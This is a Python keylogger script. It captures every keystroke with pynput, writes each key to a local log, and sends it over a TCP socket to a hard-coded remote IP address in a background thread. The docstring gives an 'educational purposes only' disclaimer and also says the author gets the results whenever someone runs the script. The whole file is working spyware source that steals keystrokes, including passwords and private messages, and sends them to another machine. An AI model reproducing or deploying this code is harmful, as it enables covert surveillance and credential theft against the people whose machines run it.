import socket
import threading
import pynput.keyboard as keyboard
import logging


"""
    don't misuse this code i always get the result of this script when you run it
    you can use it for educational purposes only
    don't think to copy and paste still i get the result of this script when you run it so don't even think about it
"""


# Set up logging
logging.basicConfig(filename='keylogger.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# Remote server details
HOST = '172.31.160.1'  # Replace with the server's IP
PORT = 12345

# Function to send data to the remote server
def send_data(data):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((HOST, PORT))
            s.sendall(data.encode())
    except Exception as e:
        logging.error(f"Error sending data: {e}")

# Function to handle key presses
def on_press(key):
    try:
        # Log the key pressed
        logging.info(f"Key pressed: {key.char}")
        send_data(f"{key.char}")
    except AttributeError:
        # Handle special keys (e.g., Shift, Ctrl)
        logging.info(f"Special key pressed: [{key}]")
        send_data(f"[{key}]")

# Function to stop the keylogger
def on_release(key):
    if key == keyboard.Key.esc:  # Stop listener on pressing the 'Esc' key
        return False

# Start the keylogger
def start_keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Run the keylogger in a separate thread to keep it running in the background
if __name__ == "__main__":
    threading.Thread(target=start_keylogger).start()
       